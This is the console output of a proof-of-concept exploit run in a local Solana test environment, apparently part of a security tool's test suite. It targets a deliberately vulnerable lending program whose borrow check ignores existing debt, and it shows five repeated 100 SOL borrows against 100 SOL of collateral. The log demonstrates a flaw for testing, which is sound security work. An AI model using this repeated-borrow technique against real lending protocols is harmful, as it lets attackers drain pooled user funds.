═══════════════════════════════════════════════════════════
 EXPLOIT: Collateral Check Bypass (SEM-001)
 Target: vulnerable_lending::borrow()
 Binary: vuln_lending.so (compiled SBF)
═══════════════════════════════════════════════════════════

[2026-02-13T19:19:20.291114893Z INFO  solana_program_test] "vuln_lending" SBF program from /home/user/anchor-shield-v2/exploits/vuln_lending.so, modified 5 minutes, 46 seconds, 47 ms, 566 µs and 74 ns ago
[1] Genesis accounts loaded:
    Pool: deposited=600 SOL, borrows=0
    User: deposited=100 SOL, borrowed=0
    Vault: 600 SOL

[2] EXPLOIT: Borrowing 100 SOL repeatedly...
    (check is: deposited >= amount, ignores existing debt)

[2026-02-13T19:19:21.181072126Z DEBUG solana_runtime::message_processor::stable_log] Program BJYyF44xEVBfZDQwRdQ2d2ErjWoESsgaXHVcSw7MAv8K invoke [1]
[2026-02-13T19:19:21.182121006Z DEBUG solana_runtime::message_processor::stable_log] Program log: Instruction: Borrow
[2026-02-13T19:19:21.182227318Z DEBUG solana_runtime::message_processor::stable_log] Program 11111111111111111111111111111111 invoke [2]
[2026-02-13T19:19:21.182264962Z DEBUG solana_runtime::message_processor::stable_log] Program 11111111111111111111111111111111 success
[2026-02-13T19:19:21.182646698Z DEBUG solana_runtime::message_processor::stable_log] Program BJYyF44xEVBfZDQwRdQ2d2ErjWoESsgaXHVcSw7MAv8K consumed 6332 of 200000 compute units
[2026-02-13T19:19:21.182701401Z DEBUG solana_runtime::message_processor::stable_log] Program BJYyF44xEVBfZDQwRdQ2d2ErjWoESsgaXHVcSw7MAv8K success
    Borrow #1: 100 SOL (cumulative debt: 100 SOL)
[2026-02-13T19:19:21.311705229Z DEBUG solana_runtime::message_processor::stable_log] Program BJYyF44xEVBfZDQwRdQ2d2ErjWoESsgaXHVcSw7MAv8K invoke [1]
[2026-02-13T19:19:21.312472871Z DEBUG solana_runtime::message_processor::stable_log] Program log: Instruction: Borrow
[2026-02-13T19:19:21.312596463Z DEBUG solana_runtime::message_processor::stable_log] Program 11111111111111111111111111111111 invoke [2]
[2026-02-13T19:19:21.312802466Z DEBUG solana_runtime::message_processor::stable_log] Program 11111111111111111111111111111111 success
[2026-02-13T19:19:21.313217392Z DEBUG solana_runtime::message_processor::stable_log] Program BJYyF44xEVBfZDQwRdQ2d2ErjWoESsgaXHVcSw7MAv8K consumed 6332 of 200000 compute units
[2026-02-13T19:19:21.313326730Z DEBUG solana_runtime::message_processor::stable_log] Program BJYyF44xEVBfZDQwRdQ2d2ErjWoESsgaXHVcSw7MAv8K success
    Borrow #2: 100 SOL (cumulative debt: 200 SOL)
[2026-02-13T19:19:21.427208421Z DEBUG solana_runtime::message_processor::stable_log] Program BJYyF44xEVBfZDQwRdQ2d2ErjWoESsgaXHVcSw7MAv8K invoke [1]
[2026-02-13T19:19:21.427517434Z DEBUG solana_runtime::message_processor::stable_log] Program log: Instruction: Borrow
[2026-02-13T19:19:21.427641182Z DEBUG solana_runtime::message_processor::stable_log] Program 11111111111111111111111111111111 invoke [2]
[2026-02-13T19:19:21.427673829Z DEBUG solana_runtime::message_processor::stable_log] Program 11111111111111111111111111111111 success
[2026-02-13T19:19:21.427720435Z DEBUG solana_runtime::message_processor::stable_log] Program BJYyF44xEVBfZDQwRdQ2d2ErjWoESsgaXHVcSw7MAv8K consumed 6332 of 200000 compute units
[2026-02-13T19:19:21.427742011Z DEBUG solana_runtime::message_processor::stable_log] Program BJYyF44xEVBfZDQwRdQ2d2ErjWoESsgaXHVcSw7MAv8K success
    Borrow #3: 100 SOL (cumulative debt: 300 SOL)
[2026-02-13T19:19:21.545407651Z DEBUG solana_runtime::message_processor::stable_log] Program BJYyF44xEVBfZDQwRdQ2d2ErjWoESsgaXHVcSw7MAv8K invoke [1]
[2026-02-13T19:19:21.546143787Z DEBUG solana_runtime::message_processor::stable_log] Program log: Instruction: Borrow
[2026-02-13T19:19:21.546229944Z DEBUG solana_runtime::message_processor::stable_log] Program 11111111111111111111111111111111 invoke [2]
[2026-02-13T19:19:21.546432944Z DEBUG solana_runtime::message_processor::stable_log] Program 11111111111111111111111111111111 success
[2026-02-13T19:19:21.546820866Z DEBUG solana_runtime::message_processor::stable_log] Program BJYyF44xEVBfZDQwRdQ2d2ErjWoESsgaXHVcSw7MAv8K consumed 6332 of 200000 compute units
[2026-02-13T19:19:21.546875674Z DEBUG solana_runtime::message_processor::stable_log] Program BJYyF44xEVBfZDQwRdQ2d2ErjWoESsgaXHVcSw7MAv8K success
    Borrow #4: 100 SOL (cumulative debt: 400 SOL)
[2026-02-13T19:19:21.661992527Z DEBUG solana_runtime::message_processor::stable_log] Program BJYyF44xEVBfZDQwRdQ2d2ErjWoESsgaXHVcSw7MAv8K invoke [1]
[2026-02-13T19:19:21.662501772Z DEBUG solana_runtime::message_processor::stable_log] Program log: Instruction: Borrow
[2026-02-13T19:19:21.662687356Z DEBUG solana_runtime::message_processor::stable_log] Program 11111111111111111111111111111111 invoke [2]
[2026-02-13T19:19:21.662858440Z DEBUG solana_runtime::message_processor::stable_log] Program 11111111111111111111111111111111 success
[2026-02-13T19:19:21.663324808Z DEBUG solana_runtime::message_processor::stable_log] Program BJYyF44xEVBfZDQwRdQ2d2ErjWoESsgaXHVcSw7MAv8K consumed 6332 of 200000 compute units
[2026-02-13T19:19:21.663375579Z DEBUG solana_runtime::message_processor::stable_log] Program BJYyF44xEVBfZDQwRdQ2d2ErjWoESsgaXHVcSw7MAv8K success
    Borrow #5: 100 SOL (cumulative debt: 500 SOL)

[3] Reading final account state...
    Deposited: 100 SOL
    Borrowed:  500 SOL
    Debt ratio: 500%

═══════════════════════════════════════════════════════════
 >>> EXPLOIT CONFIRMED on compiled SBF binary <<<
 Borrowed 500 SOL with only 100 SOL collateral
 500% debt ratio — should be capped at 75%
 Borrows executed: 5 (should be max 1 at 75% LTV)
═══════════════════════════════════════════════════════════
EXIT CODE: 
EXIT CODE: 0
